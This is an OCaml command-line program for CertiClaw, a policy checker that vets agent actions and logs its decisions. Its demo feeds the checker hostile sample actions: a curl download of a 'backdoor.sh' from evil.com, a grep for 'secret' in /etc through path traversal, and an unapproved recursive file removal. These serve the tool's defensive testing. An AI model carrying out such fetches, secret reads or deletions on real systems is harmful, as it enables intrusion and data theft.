(** CertiClaw CLI — load policy from file, run demo actions, emit audit logs.

    Usage:
      certiclaw --demo                       Run demo with built-in policy
      certiclaw --demo --policy policy.json  Run demo with file policy
      certiclaw --policy policy.json         Load and validate policy only

    Flags:
      --policy PATH    Load policy from JSON file
      --demo           Run sample actions through the pipeline
      --dry-run        (default) Do not execute commands
      --execute        Actually execute validated commands
      --audit-json     Print audit log as JSON lines instead of text *)

open Certiclaw.Types
open Certiclaw.Infer
open Certiclaw.Plan
module Audit = Certiclaw.Audit

(* ------------------------------------------------------------------ *)
(* CLI argument parsing                                                *)
(* ------------------------------------------------------------------ *)

type cli_config = {
  policy_path : string option;
  run_demo    : bool;
  dry_run     : bool;
  audit_json  : bool;
}

let parse_args () =
  let cfg = ref {
    policy_path = None;
    run_demo    = false;
    dry_run     = true;
    audit_json  = false;
  } in
  let args = Array.to_list Sys.argv |> List.tl in
  let rec go = function
    | [] -> ()
    | "--policy" :: path :: rest ->
      cfg := { !cfg with policy_path = Some path }; go rest
    | "--demo" :: rest ->
      cfg := { !cfg with run_demo = true }; go rest
    | "--dry-run" :: rest ->
      cfg := { !cfg with dry_run = true }; go rest
    | "--execute" :: rest ->
      cfg := { !cfg with dry_run = false }; go rest
    | "--audit-json" :: rest ->
      cfg := { !cfg with audit_json = true }; go rest
    | "--help" :: _ | "-h" :: _ ->
      Printf.printf "Usage: certiclaw [--policy PATH] [--demo] [--dry-run|--execute] [--audit-json]\n";
      exit 0
    | arg :: _ ->
      Printf.eprintf "Unknown argument: %s\n" arg;
      exit 1
  in
  go args;
  !cfg

(* ------------------------------------------------------------------ *)
(* Built-in demo policy                                                *)
(* ------------------------------------------------------------------ *)

let builtin_policy : policy = {
  readable_paths = ["/home/user/src"];
  writable_paths = ["/home/user/src"; "/tmp"];
  allowed_bins   = ["grep"; "curl"; "find"];
  allowed_hosts  = ["example.com"];
  allowed_mcp    = [("files", "read_file")];
}

(* ------------------------------------------------------------------ *)
(* Demo actions                                                        *)
(* ------------------------------------------------------------------ *)

let demo_actions () =
  let a1 = GrepRecursive {
    pattern = "TODO"; root = "/home/user/src"; output = "/tmp/todos.txt"
  } in
  let a2 = RemoveByGlob {
    root = "/tmp"; suffix = ".log"; recursive = true
  } in
  let a3 = CurlToFile {
    url = "https://evil.com/backdoor.sh"; host = "evil.com";
    output = "/tmp/backdoor.sh"
  } in
  let a4 = McpCall {
    server = "files"; tool = "read_file";
    args = {|{"path": "/home/user/src/main.ml"}|}
  } in
  let a5 = GrepRecursive {
    pattern = "secret"; root = "/home/user/src/../../../etc";
    output = "/tmp/secrets.txt"
  } in
  let mk_proof action ~destructive ~approval =
    { claimed_effects = infer_effects action;
      destructive; approval; explanation = None }
  in
  [ ("Valid grep",            a1, mk_proof a1 ~destructive:false ~approval:None);
    ("Remove without approval", a2, mk_proof a2 ~destructive:true ~approval:None);
    ("Curl to evil host",     a3, mk_proof a3 ~destructive:false ~approval:None);
    ("Valid MCP read_file",   a4, mk_proof a4 ~destructive:false ~approval:None);
    ("Path traversal attempt", a5, mk_proof a5 ~destructive:false ~approval:None);
  ]

(* ------------------------------------------------------------------ *)
(* Run demo                                                            *)
(* ------------------------------------------------------------------ *)

let run_demo ~policy ~dry_run ~(audit_log : Audit.audit_log) =
  Printf.printf "\n=== CertiClaw Demo ===\n\n";
  let actions = demo_actions () in
  List.iter (fun (label, action, proof) ->
    Printf.printf "--- %s ---\n" label;
    Printf.printf "IR:      %s\n" (show_action action);
    Printf.printf "Effects: [%s]\n"
      (String.concat "; " (List.map show_action_effect (infer_effects action)));
    (match plan ~dry_run ~audit_log ~policy ~proof action with
     | Ok p ->
       Printf.printf "Check:   ACCEPTED\n";
       Printf.printf "Render:  %s\n" (show_rendered p.rendered);
       Printf.printf "Mode:    %s\n" (if p.dry_run then "dry-run" else "live")
     | Error err ->
       Printf.printf "Check:   REJECTED — %s\n" (show_check_error err));
    Printf.printf "\n"
  ) actions

(* ------------------------------------------------------------------ *)
(* Main                                                                *)
(* ------------------------------------------------------------------ *)

let () =
  let cfg = parse_args () in

  (* Load policy *)
  let policy = match cfg.policy_path with
    | None ->
      if cfg.run_demo then begin
        Printf.printf "Using built-in demo policy.\n";
        builtin_policy
      end else begin
        Printf.printf "No --policy specified and --demo not set.\n";
        Printf.printf "Usage: certiclaw [--policy PATH] [--demo] [--dry-run|--execute] [--audit-json]\n";
        exit 0
      end
    | Some path ->
      Printf.printf "Loading policy from %s...\n" path;
      match Certiclaw.Policy_load.load_file path with
      | Ok pol ->
        Printf.printf "Policy loaded successfully.\n";
        Printf.printf "  readable_paths: %d entries\n"
          (List.length pol.readable_paths);
        Printf.printf "  writable_paths: %d entries\n"
          (List.length pol.writable_paths);
        Printf.printf "  allowed_bins:   %d entries\n"
          (List.length pol.allowed_bins);
        Printf.printf "  allowed_hosts:  %d entries\n"
          (List.length pol.allowed_hosts);
        Printf.printf "  allowed_mcp:    %d entries\n"
          (List.length pol.allowed_mcp);
        pol
      | Error e ->
        Printf.eprintf "ERROR: %s\n"
          (Certiclaw.Policy_load.show_policy_load_error e);
        exit 1
  in

  (* Set up audit log *)
  let log = Audit.create_log () in

  (* Run demo if requested *)
  if cfg.run_demo then
    run_demo ~policy ~dry_run:cfg.dry_run ~audit_log:log;

  (* Print audit log *)
  let records = Audit.get_records log in
  if records <> [] then begin
    Printf.printf "\n=== Audit Log ===\n\n";
    if cfg.audit_json then
      List.iter (fun r -> Printf.printf "%s\n" (Audit.json_record r)) records
    else
      List.iter (fun r -> Printf.printf "%s\n\n" (Audit.show_record r)) records
  end
